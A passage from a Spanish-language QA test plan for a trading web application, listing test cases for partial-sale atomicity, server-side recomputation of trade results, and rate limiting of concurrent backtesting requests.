   - *Acción:* Simular una interrupción de red en el proceso de venta parcial del 50%.
   - *Resultado esperado:* El trade original debe mantener su porcentaje inicial inalterado si la operación de venta no se completa íntegramente.
5. **TC-BIZ-02 (Cálculo autoritativo de rendimiento):**
   - *Acción:* Enviar `PUT /api/trades/:id` con `entry_price: 100`, `exit_price: 110` y forzar `result: -50`.
   - *Resultado esperado:* El backend ignora el `-50` enviado por el cliente y almacena `+10.00%`.

### 6.3 Pruebas de Estabilidad y Carga
6. **TC-STAB-01 (Protección contra caída 503 en Backtesting):**
   - *Acción:* Disparar 15 peticiones concurrentes a `GET /api/backtesting/AAPL`.
   - *Resultado esperado:* El servidor limita las peticiones con HTTP 429 Too Many Requests sin agotar el pool de MySQL ni provocar caídas de LiteSpeed (503).
